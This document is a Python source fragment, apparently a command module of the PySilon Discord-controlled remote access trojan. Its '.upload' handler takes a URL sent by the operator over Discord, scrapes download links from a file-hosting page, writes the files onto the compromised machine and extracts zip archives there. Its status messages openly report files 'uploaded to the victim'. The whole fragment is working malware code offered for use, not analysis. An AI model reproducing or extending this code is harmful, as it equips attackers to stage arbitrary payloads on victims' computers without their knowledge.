from bs4 import BeautifulSoup
import requests
from zipfile import ZipFile
# end of imports

# on message
elif message.content[:7] == '.upload':
    url = message.content[8:]
    embed = discord.Embed(title="🟢 Succsess",description=f'```Uploading from: {url}.```', colour=0x013220)
    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
    
    await message.channel.send(embed=embed)
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', {'class': 'btn btn-primary btn-block'})
        for link in links:
            try:
                file_url = link['href']
                file_name = file_url.split('/')[-1]
                with open(file_name, 'wb') as f:
                    f.write(requests.get(file_url).content)
                    f.close()
            except Exception as e:
                embed = discord.Embed(title="📛 Error",description=f'```Error while downloading specific file ({file_name}): {e}```', colour=0x8B0000)
                embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                
                await message.channel.send(embed=embed)
                pass
        if len(links) == 1:
            if file_name.split('.')[-1] == 'zip':
                with ZipFile(file_name, 'r') as zip:
                    zip.extractall()
                    embed = discord.Embed(title="🟢 Succsess",description='```Uploaded and extracted all files from the link to the victim.\nFiles will be located in the pysilon directory.```', colour=0x013220)
                    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                    
                    await message.channel.send(embed=embed)
            else:
                embed = discord.Embed(title="🟢 Succsess",description=f'```Uploaded all files from the link to the victim.\nFiles will be located in the pysilon directory.```', colour=0x013220)
                embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                
                await message.channel.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="📛 Error",description=f'```Error while downloading from the link.\nUsage: .upload <link>\nDo not upload the link to to the file directly.\nGood: https://anonfiles.com/k5X7D...\nBad: https://anonfiles.com/k5X7D.../file-name```\n\n`{e}`', colour=0x8B0000)
        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
        
        await message.channel.send(embed=embed)
        pass
